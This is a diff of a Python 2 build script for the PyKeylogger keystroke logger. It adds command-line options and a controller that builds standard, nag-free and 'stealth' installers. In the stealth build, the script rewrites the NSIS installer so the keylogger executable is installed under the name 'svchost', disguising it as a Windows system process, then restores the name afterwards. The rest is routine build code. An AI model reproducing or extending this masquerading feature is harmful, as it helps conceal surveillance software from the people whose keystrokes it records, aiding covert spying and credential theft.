@@ -4,13 +4,46 @@ import sys
 import re
 import shutil
 
+from optparse import OptionParser
+
 import zipfile
 import zlib
+
+class DistributionBuilderController:
+    def __init__(self):
+        self.ParseOptions() # stored in self.cmdoptions
+    
+    def run(self):
+        if self.cmdoptions.disttype in ['standard', 'all']:
+            print "Running standard build..."
+            db = DistributionBuilder('standard')
+            db.run()
+        if self.cmdoptions.disttype in ['nonag', 'all']:
+            print "Running nonag build..."
+            db = DistributionBuilder('nonag')
+            db.run()
+        if self.cmdoptions.disttype in ['stealth', 'all']:
+            print "Running stealth build..."
+            db = DistributionBuilder('stealth')
+            db.run()
+    
+    def ParseOptions(self):
+        '''Read command line options
+        '''
+        parser = OptionParser(version=version.description + " version " + version.version + " (" + version.url + ").")
+        parser.add_option("-d", "--debug", action="store_true", dest="debug", help="debug mode (print extra debug output) [default: %default]")
+        parser.add_option("-t", "--disttype", action="store", dest="disttype", help="type of distribution to build ('standard', 'nonag', 'stealth', or 'all'. [default: %default]")
+        
+        parser.set_defaults(debug=False, 
+                            disttype="all")
+        
+        (self.cmdoptions, args) = parser.parse_args()
 
 class DistributionBuilder:
     def __init__(self, disttype):
         '''disttype is either "standard", "nonag", or "stealth"
         stealth is also nagless'''
+        
         self.disttype = disttype
         if self.disttype == 'standard':
             self.filename_addendum = ''
@@ -173,9 +206,15 @@ class DistributionBuilder:
         '''
         self.update_nsis_script_version()
         
+        if self.disttype == 'stealth':
+            self.toggle_nsis_stealth_params('svchost')
+        
         print r'"C:\Program Files\NSIS\makensis.exe" pykeylogger_install_script.nsi'
         os.system(r'"C:\Program Files\NSIS\makensis.exe" pykeylogger_install_script.nsi')
-    
+        
+        if self.disttype == 'stealth':
+            self.toggle_nsis_stealth_params('pykeylogger')
+        
     def update_nsis_script_version(self):
         f = open('pykeylogger_install_script.nsi','r')
         try:
@@ -190,7 +229,21 @@ class DistributionBuilder:
                 f.write(line)
         finally:
             f.close()
-
+    
+    def toggle_nsis_stealth_params(self, stealthname):
+        f = open('pykeylogger_install_script.nsi','r')
+        try:
+            contents=f.readlines()
+        finally:
+            f.close()
+        
+        f = open('pykeylogger_install_script.nsi','w')
+        try:
+            for line in contents:
+                line = re.sub('^( *!define PYKEYLOGGER_EXENAME ).*', '\\1' + '"' + stealthname + '"', line)
+                f.write(line)
+        finally:
+            f.close()
     
     def ZipFiles(self, targetdir, ziparchivename):
         '''Create a zip archive of all files in the target directory.
@@ -215,9 +268,5 @@ class DistributionBuilder:
 
 if __name__ == '__main__':
     
-    db = DistributionBuilder('standard')
-    db.run()
-    db = DistributionBuilder('nonag')
-    db.run()
-    db = DistributionBuilder('stealth')
-    db.run()
+    dbc = DistributionBuilderController()
+    dbc.run()
